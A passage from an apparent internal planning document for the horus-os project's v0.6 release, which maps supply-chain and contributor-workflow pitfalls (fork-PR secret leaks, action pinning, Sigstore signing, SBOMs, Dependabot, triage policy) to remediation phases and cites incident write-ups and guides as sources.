| Sigstore OIDC token expired mid-build | LOW | Re-run the workflow; the OIDC mint happens fresh; document in CHANGELOG-internal if it became a release-blocker; tighten the sign-step ordering so it's position 2 |
| Sigstore verification accepts wrong identity | HIGH | Disclose: any user who verified the affected release got a false confidence; ship a `verify_release.py` patch with the corrected identity; communicate via pinned Discussion + Security Advisory; the affected release stays on PyPI with the advisory note (yanking is worse) |
| SBOM-vs-wheel diff fails on a shipped release | MEDIUM | Patch release with corrected SBOM; CHANGELOG entry explaining the SBOM was incomplete; release-gate hardening so future releases cannot ship the same gap |
| pip-audit blocked release on false positive | LOW | Add the GHSA to `.github/pip-audit-ignore.txt` with a dated comment; re-run release; postmortem if the false positive should have been in the ignore list pre-emptively |
| Dependabot security PR sat for >14 days unmerged | MEDIUM | Merge immediately if still valid; patch release; postmortem on triage cadence; reinforce the security-PR triage discipline in `docs/TRIAGE.md` |
| `PYPI_API_TOKEN` accidentally created post-flip | MEDIUM | Revoke immediately at PyPI; audit workflow run logs since token creation; confirm Trusted Publishing is configured; release-gate hardening prevents recurrence |
| First-week PR overload | LOW-MEDIUM | Hit the throttle: announce in pinned Discussion that gate is freezing for 1 week; CONTRIBUTING.md updates to reflect; existing PRs continue under triage; freeze lifts when queue drops below the trigger |
| CONTRIBUTING.md promised 24h that we cannot meet | LOW | Edit to "aim to acknowledge within 7 days"; pinned Discussion announces the change; no need for a release; future contributors see the corrected expectations |
| Stale-bot accidentally enabled and closed real bugs | MEDIUM | Disable the bot; audit closed-by-bot issues; reopen those that look real; pinned Discussion announces and apologizes; `.planning/decisions/no-stale-bot.md` re-affirmed |
| `good-first-issue` label mis-calibrated | LOW | Re-label issues that should be `good-second-issue`; first-time contributor who was stuck gets a maintainer comment offering help or a smaller scope; pattern documented in `docs/TRIAGE.md` |
| Two-tier gate broke (network check leaked to pre-merge) | LOW | Move the check back to pre-release tier; documented in CHANGELOG-internal; release-gate hardening prevents recurrence |
| Gate flip needs rollback | MEDIUM | Revert the flip commit (which touches STATUS.md and CONTRIBUTING.md); pinned Discussion announces with reason; CONTRIBUTING.md reflects "solo mode" again; existing PRs continue to completion; postmortem in `.planning/incidents/` |
| Tag signed but Release artifacts unsigned | MEDIUM | Re-run the release workflow to attach the missing signatures; users who pulled the unsigned wheel are advised to re-verify after the fix; release-gate hardening prevents recurrence |
| CHANGELOG drift | LOW | Patch release with corrected CHANGELOG; release workflow regenerates Release notes from CHANGELOG; no functional impact |
| SECURITY.md SLO breached | LOW-MEDIUM | "Over-capacity acknowledgement" comment on the affected advisory; SECURITY.md edits to relax the SLO language if breach is systematic; pinned Discussion if a reporter has gone public |
| CODEOWNERS blocks maintainer's own PR | LOW | Use the admin bypass (logged); confirm CODEOWNERS scope is only high-risk paths; refine if too broad |

## Pitfall-to-Phase Mapping

Maps each pitfall to the v0.6 phase that owns its prevention. Phase numbers continue from v0.5's Phase 50; v0.6 phases start at 51.

| Pitfall | Prevention Phase(s) | Verification |
|---------|---------------------|--------------|
| 1: `pull_request_target` secret leak | 51 (CI hardening), 52 (label gate), 58 (release-gate workflow lint) | Workflow YAML lint rejects unsafe patterns; fixture workflow simulating a fork PR with `safe-to-test` label asserts secrets never appear in unprivileged jobs; release-gate audits `permissions:` defaults |
| 2: Mutable action tag pin | 51 (SHA-pin lint), 54 (Dependabot github-actions) | `grep -E "uses: [^@]+@v[0-9]"` in `.github/workflows/` fails the build; freshness check warns on stale pins |
| 3: Sigstore OIDC / identity mismatch | 53 (signing substrate), 58 (release-gate verify) | Negative test rejects wrong-identity signature; sign step ≤5min after OIDC mint; bundle format only |
| 4: SBOM drift from wheel | 54 (supply-chain), 58 (release-gate diff) | SBOM-vs-wheel diff in release-gate; format lock at CycloneDX 1.6 JSON; transitive coverage test |
| 5: pip-audit FP / Dependabot grouping | 54 (supply-chain), 55 (Dependabot tuning) | Ignore-list format lint; tracking-file age check; Dependabot config excludes security-updates from groups |
| 6: CONTRIBUTING.md overpromises | 56 (contributor docs) | "Aim to" language; no CLA decision file; Discord optional; `docs/TRIAGE.md` lands with cadence |
| 7: Stale-bot / label sprawl | 56 (contributor docs), 58 (release-gate label health) | `no-stale-bot.md` decision; label taxonomy ≤15; `good-first-issue` rubric |
| 8: Release-gate slow / flaky | 58 (release-gate extension) | Two-tier split; offline-mode fallback per network check; retry cap |
| 9: PyPI long-lived token | 53 (Trusted Publishing), 58 (release-gate audit), 60 (gate flip) | Trusted Publishing configured pre-flip; release-gate audits secret list; PEP 740 attestation visible at install |
| 10: Gate flip no rollback | 59 (soft launch), 60 (gate flip with rollback) | `flip-gate-revert.md` ready; `POSTFLIP-PLAYBOOK.md` lands with flip; soft launch ran |
| 11: Signature chain split | 53 (gitsign for tags), 57 (SECURITY.md table), 58 (release-gate all-artifacts), 60 (rehearsal) | All artifacts attached atomically; CHANGELOG extracted automatically; `verify_release.py` ships |
| 12: SECURITY.md SLO / CODEOWNERS theater | 56 (CODEOWNERS scoping), 57 (SECURITY.md SLO refresh) | "Aim to" with severity tiers; CODEOWNERS path-scoped; test advisory filed; coordinated disclosure default |

**Suggested v0.6 phase outline (for the roadmapper to refine):**

- **Phase 51** — CI hardening substrate: workflow lint (`pull_request_target` audit, SHA-pin enforcement, permissions audit, no-shell-interpolation lint), `permissions: read-all` default; `safe-to-test` label gate scaffolding. Pure infrastructure. Pitfalls 1, 2.
- **Phase 52** — Fork-PR CI split: `pull_request` (unprivileged) workflow shape, `workflow_run`-based privileged checks, `safe-to-test` label gate with auto-strip on push. Pitfall 1.
- **Phase 53** — Signing substrate: sigstore-python wheel/sdist via `gh-action-sigstore-python` pinned by SHA; gitsign for tags; PyPI Trusted Publishing (PEP 807) setup; workflow-scoped identity constant; `verify_release.py` scaffolding; `tests/test_release_verification.py` and `tests/test_release_oidc_flow.py` negative tests. Pitfalls 3, 9, 11.
- **Phase 54** — Supply-chain substrate: `cyclonedx-py` SBOM generation against installed wheel; CycloneDX 1.6 JSON format lock; two-SBOM convention (clean + `[dev,otel]`); pip-audit on PRs (dual-run OSV + PyPI); ignore-list discipline; tracking-file pattern. Pitfalls 4, 5.
- **Phase 55** — Dependabot tuning: `package-ecosystem: pip` and `package-ecosystem: github-actions`; grouping rules (routine batched, security un-grouped); `security-update` label and template. Pitfalls 2, 5.
- **Phase 56** — Contributor docs: CONTRIBUTING.md (no CLA, no 24h SLA, Discord optional, claim flow, anti-goals); PR template (≤7 checkboxes, `accepted-for-review` note); issue templates (bug, feature, security-redirect, discussion); CODEOWNERS path-scoped; `docs/TRIAGE.md` (weekly cadence, label taxonomy ≤15, `good-first-issue` rubric, "may go silent" disclaimer); `docs/LABEL-TAXONOMY.md`; `.planning/decisions/no-cla.md`, `no-stale-bot.md`. Pitfalls 6, 7, 12.
- **Phase 57** — SECURITY.md disclosure flow: "aim to" SLO language with severity tiers; coordinated disclosure 90-day default; over-capacity acknowledgement pattern; supported-versions table refreshed (v0.5.x + v0.6.x supported); `docs/MAINTAINER-SETUP.md` with test-advisory ritual. Pitfalls 11, 12.
- **Phase 58** — Release-gate extension: two-tier split (pre-merge local <10s, pre-release network ~60s); offline-mode fallback per network check; retry-with-cap; structured JSON report; SBOM-matches-wheel diff; signature presence and bundle-format check; `.github/pip-audit-tracking/` age check; CHANGELOG-section check; SECURITY.md table sync check; label-health and label-count check; pin-freshness check. Pitfalls 1, 2, 3, 4, 5, 7, 8, 9, 11.
- **Phase 59** — Soft launch: 3-5 invited contributors file sample PRs (bug fix, docs, adapter, plugin example, refactor); friction points identified and fixed; CHANGELOG credit. Pitfall 10.
- **Phase 60** — Gate flip: STATUS.md TL;DR rewrite ("contributions OPEN"); CONTRIBUTING.md activation; README CTA; pinned Discussion announcement; `.planning/rollback/flip-gate-revert.md` ready; `docs/POSTFLIP-PLAYBOOK.md` lands (decision matrix, freeze triggers, burnout triggers); release rehearsal (`v0.6.0-rc1` on a fork); `accepted-for-review` throttle active for 30 days; first-week monitoring. Pitfalls 10, 11.
- **Phase 61** — v0.6.0 release: tag (gitsign-signed), wheel + sdist + 2 SBOMs + signature bundles, GitHub Release with extracted CHANGELOG notes, PyPI publish via Trusted Publishing with PEP 740 attestation. Pitfalls 3, 4, 9, 11.

Execution order is mostly sequential because each phase consumes the prior phase's substrate. Legitimate parallel opportunities (mirroring v0.5 (Phase 44 ∥ 45) shape): Phase 53 (signing) and Phase 54 (supply-chain) can run in parallel once Phase 51's CI substrate ships, since both consume the same hardened workflow shape without depending on each other. Phase 56 (contributor docs) and Phase 57 (SECURITY.md) can also run in parallel once the v0.6 decisions are locked.

`tests/test_contribution_gate_pitfalls/` mirrors this file: one test file per pitfall, derived 1:1 (matching the v0.5 `tests/test_plugin_pitfalls/` precedent). The downstream-consumer phase that derives the regression tests reads each pitfall's "How to avoid" + "Warning signs" sections and writes the corresponding `test_pitfall_NN_<name>.py`.

## Sources

**`pull_request_target` fork PR secret leak incidents:**
- [Ultralytics supply-chain attack analysis (PyPI Blog, Dec 11 2024)](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/) — 8.3.41 / 8.3.42 via pull_request_target + branch-name code injection; 8.3.45 / 8.3.46 via leaked PyPI token (second wave)
- [Legit Security: The Ultralytics Supply Chain Attack](https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent)
- [Wiz Threat Intelligence: Ultralytics compromise](https://threats.wiz.io/all-incidents/ultralytics-compromise)
- [Snyk: Ultralytics AI Pwn Request Supply Chain Attack](https://snyk.io/blog/ultralytics-ai-pwn-request-supply-chain-attack/)
- [Spotipy GHSA-h25v-8c87-rvm8 — pull_request_target secrets exfiltration](https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-h25v-8c87-rvm8)
- [Orca Security: pull_request_nightmare Part 1 + Part 2](https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/) — research on ~5,000 repos using `pull_request_target`; ~1% exploitable
- ["testedbefore" March 2026 campaign (GitHub Community Discussion #179107)](https://github.com/orgs/community/discussions/179107) — 500+ malicious PRs across six throwaway accounts
- [Sysdig: Insecure GitHub Actions in MITRE, Splunk, and other OSS repos](https://www.sysdig.com/blog/insecure-github-actions-found-in-mitre-splunk-and-other-open-source-repositories)
- [GitHub Security Lab: preventing-pwn-requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GitHub Security Lab: safe handling of untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [michaelheap.com: Accessing secrets from forks safely](https://michaelheap.com/access-secrets-from-forks/)

**Mutable git tag / action pinning compromises:**
- [Unit 42: GitHub Actions Supply Chain Attack (tj-actions/changed-files, CVE-2025-30066)](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/) — March 2025; ~23,000 repos affected
- [Cycode: tj-actions/changed-files Complete Guide](https://cycode.com/blog/github-action-tj-actions-changed-files-supply-chain-attack-the-complete-guide/)
- [Harness: Assessing the tj-actions supply chain attack](https://www.harness.io/blog/github-actions-supply-chain-attack-tj-actions-changed-files)
- [Phoenix Security: CVE-2025-30066](https://phoenix.security/tj-actions-compromise/)
- [emmer.dev: Pin Your GitHub Actions to Protect Against Supply Chain Attacks](https://emmer.dev/blog/pin-your-github-actions-to-protect-against-mutability/)
- [GitHub Changelog: Actions policy now supports SHA pinning](https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/) — August 2025
- [neteye-blog.com: How to Secure GitHub Actions with SHA Pinning](https://www.neteye-blog.com/2025/06/how-to-secure-github-actions-with-sha-pinning/)
- [Tenki: GitHub Actions Workflow Lockfiles Are Coming](https://www.tenki.cloud/blog/github-actions-workflow-lockfiles)

**Sigstore / PyPI signing:**
- [sigstore-python — official docs](https://sigstore.github.io/sigstore-python/) and [verification docs](https://sigstore.github.io/sigstore-python/verify/)
- [sigstore/gh-action-sigstore-python](https://github.com/sigstore/gh-action-sigstore-python) — GitHub Action
- [Sigstore: OIDC in Fulcio](https://docs.sigstore.dev/certificate_authority/oidc-in-fulcio/) — short-lived certificate model
- [Sigstore Information | Python.org](https://www.python.org/downloads/metadata/sigstore/) — CPython's sigstore usage as a precedent
- [sigstore-java GHSA-jp26-88mw-89qr — vulnerability in bundle verification](https://github.com/sigstore/sigstore-java/security/advisories/GHSA-jp26-88mw-89qr) — JVM analogue of the "wrong identity passes verification" trap
- [PEP 740 — Index support for digital attestations](https://peps.python.org/pep-0740/)
- [PEP 807 — Index support for Trusted Publishing](https://peps.python.org/pep-0807/)
- [PyPI Blog: PyPI now supports digital attestations (Nov 14 2024)](https://blog.pypi.org/posts/2024-11-14-pypi-now-supports-digital-attestations/)
- [Trail of Bits: Attestations: A new generation of signatures on PyPI](https://blog.trailofbits.com/2024/11/14/attestations-a-new-generation-of-signatures-on-pypi/)
- [PyPI Publish Attestation v1 docs](https://docs.pypi.org/attestations/publish/v1/)
- [Warehouse: Attestation Internals](https://warehouse.pypa.io/security/attestation-internals/)

**SBOM generation discipline:**
- [Sbomify: Generate SBOMs for Python Packages with pipdeptree and cyclonedx-py](https://sbomify.com/2024/07/30/generate-sboms-for-python-packages-with-pipdeptree-and-cyclonedx-py/)
- [Sbomify: SBOM Generation Guide for Python — UV, Poetry, Pipenv](https://sbomify.com/guides/python/)
- [SafeDep: SBOM Completeness with Direct & Transitive Dependencies](https://safedep.io/sbom-direct-transitive-deps/)
- [Anchore: Generate Python SBOMs with pipdeptree vs Syft](https://anchore.com/blog/python-sbom-generation/)
- [arXiv 2409.01214: SBOM Generation Tools in the Python Ecosystem](https://arxiv.org/html/2409.01214v1)
- [Sbomify: SBOM Formats Compared — CycloneDX vs SPDX](https://sbomify.com/2026/01/15/sbom-formats-cyclonedx-vs-spdx/)
- [HeroDevs: SPDX vs CycloneDX](https://www.herodevs.com/blog-posts/spdx-vs-cyclonedx-choosing-the-right-sbom-format-for-your-software-supply-chain)
- [Sonatype: How to Convert Your SBOM Between SPDX and CycloneDX](https://www.sonatype.com/blog/how-to-convert-your-sbom-between-spdx-and-cyclonedx-formats)
- [CycloneDX Python documentation](https://cyclonedx-bom-tool.readthedocs.io/en/v3.7.3/usage.html)

**pip-audit and supply-chain scanning:**
- [pypa/pip-audit on GitHub](https://github.com/pypa/pip-audit)
- [pypa/advisory-database on GitHub](https://github.com/pypa/advisory-database)
- [pip-audit issue #274 — OSV vs PyPI service differences](https://github.com/pypa/pip-audit/issues/274)
- [Inedo: pip audit Strengths and Limits in PyPI Security](https://blog.inedo.com/python/pypi-package-vulnerabilities)

**Dependabot configuration:**
- [GitHub Docs: Configuring Dependabot security updates](https://docs.github.com/github/managing-security-vulnerabilities/configuring-dependabot-security-updates)
- [Nesbitt: 16 Best Practices for Reducing Dependabot Noise (Jan 2026)](https://nesbitt.io/2026/01/10/16-best-practices-for-reducing-dependabot-noise.html)
- [StepSecurity: Dependabot Cooldown and Group Support](https://www.stepsecurity.io/blog/announcing-dependabot-configuration-enhancements-cooldown-and-group-support)
- [GitHub Community Discussion #78188: Grouped Security PRs for Dependabot](https://github.com/orgs/community/discussions/78188) — beta feedback
- [bswen: How Do I Configure Dependabot Cooldown for Python Dependencies (April 2026)](https://docs.bswen.com/blog/2026-04-02-dependabot-cooldown-python/)

**CONTRIBUTING.md and CLA anti-patterns:**
- [Ben Balter: Why you probably shouldn't add a CLA to your open source project](https://ben.balter.com/2018/01/02/why-you-probably-shouldnt-add-a-cla-to-your-open-source-project/)
- [Developer Certificate of Origin](https://developercertificate.org/)
- [Google Open Source: Contributor License Agreements](https://opensource.google/documentation/reference/cla/)
- [Open Source Guides: Maintaining Balance for Open Source Maintainers](https://opensource.guide/maintaining-balance-for-open-source-maintainers/)

**Stale bot and label taxonomy:**
- [Drew DeVault: GitHub stale bot considered harmful](https://drewdevault.com/2021/10/26/stalebot.html)
- [Jacob Tomlinson: Most stale bots are anti-user and anti-contributor](https://jacobtomlinson.dev/posts/2024/most-stale-bots-are-anti-user-and-anti-contributor-but-they-dont-have-to-be/)
- [IEEE / Curtis Newton: Should I Stale or Should I Close?](https://ieeexplore.ieee.org/document/8823598/) — empirical study
- [actions/stale on GitHub](https://github.com/actions/stale)
- [GitUI Discussion #1002: remove stale bot](https://github.com/extrawurst/gitui/discussions/1002)

**Solo-maintainer burnout and SECURITY.md SLO realism:**
- [Socket: The Unpaid Backbone of Open Source — Solo Maintainers Face Increasing Security Demands](https://socket.dev/blog/the-unpaid-backbone-of-open-source)
- [Intel Developer: Maintainer Burnout is a Problem. So, What Are We Going to Do About It?](https://www.intel.com/content/www/us/en/developer/articles/community/maintainer-burnout-a-problem-what-are-we-to-do.html)
- [OSI News: The price for software security and maintainer burnout](https://opensource.org/blog/the-price-for-software-security-and-maintainer-burnout-osi-news-updates)
- [The New Stack: How Maintainer Burnout Is Causing a Kubernetes Security Disaster](https://thenewstack.io/how-maintainer-burnout-is-causing-a-kubernetes-security-disaster/)
- [Open Source Pledge: Burnout in Open Source — A Structural Problem](https://opensourcepledge.com/blog/burnout-in-open-source-a-structural-problem-we-can-fix-together/)

**CODEOWNERS single-user limitations:**
- [GitHub Community Discussion #14866: Allow code owners to review their own PRs](https://github.com/orgs/community/discussions/14866)
- [GitHub Community Discussion #22522: CODEOWNER Required Reviews](https://github.com/orgs/community/discussions/22522)
- [Arnica: What every developer should know about GitHub CODEOWNERS](https://www.arnica.io/blog/what-every-developer-should-know-about-github-codeowners)
- [Jeremy Long: Bypassing-Required-Reviews](https://github.com/jeremylong/Bypassing-Required-Reviews) — empirical bypass research

**Coordinated disclosure precedent:**
- [Google Project Zero: Feedback and data-driven updates to disclosure](https://googleprojectzero.blogspot.com/2015/02/feedback-and-data-driven-updates-to.html) — 90-day default
- [FIRST CVSS 3.1 specification](https://www.first.org/cvss/v3.1/specification-document)
- [GitHub Docs: Security advisories](https://docs.github.com/en/code-security/security-advisories)

**Related supply-chain attack writeups (cited for shape, not directly affecting horus-os):**
- [Wiz LiteLLM TeamPCP writeup](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign) — PyPI 1.82.7 / 1.82.8 trojanized; same supply-chain class as Ultralytics
- [Snyk: elementary-data PyPI Package Steals Cloud Credentials](https://snyk.io/blog/malicious-release-of-elementary-data-pypi-package-steals-cloud-credentials-from-data-engineers/)

**Internal cross-references:**
- `/Users/santino/Projects/horus-os/SECURITY.md` lines 7-12 — stale supported-versions table (v0.3.x listed; v0.5.0 shipped); Pitfall 11/12 must fix
- `/Users/santino/Projects/horus-os/SECURITY.md` lines 30-32 — current acknowledgement and response SLA; Pitfall 12 refines with severity tiers and "aim to" language
- `/Users/santino/Projects/horus-os/SECURITY.md` lines 59-65 — "Contributor-pipeline security (not active yet)" — Pitfall 1's CI hardening lands the actual mechanism
- `/Users/santino/Projects/horus-os/STATUS.md` lines 14-26 — "solo development mode" TL;DR; Pitfall 10's gate-flip rollback target
- `/Users/santino/Projects/horus-os/.planning/PROJECT.md` lines 41-46 — decisions to confirm at requirements time (signing identity, SBOM format, scanner, fork-PR gating); this file ratifies the locks (sigstore-keyless, CycloneDX 1.6 JSON, pip-audit dual-run, `safe-to-test` label gate)
- `/Users/santino/Projects/horus-os/.planning/research/PITFALLS.md` (prior v0.5 version, committed 2026-05-26) — pitfall format precedent; v0.5's `tests/test_plugin_pitfalls/` is the 1:1 regression-test pattern v0.6 mirrors
- `/Users/santino/Projects/horus-os/scripts/release_gate.py` (v0.4 Phase 39, extended in v0.5 Phase 49) — release-gate substrate; Pitfalls 4, 8, 11 extend it
- `/Users/santino/Projects/horus-os/.github/workflows/` — current 3-OS × 2-Python matrix; v0.6 adds workflows but does not add OSes; Pitfall 8's two-tier split applies to ALL of them

---
*Pitfalls research for: v0.6 Contribution Gate readiness*
*Researched: 2026-05-29*
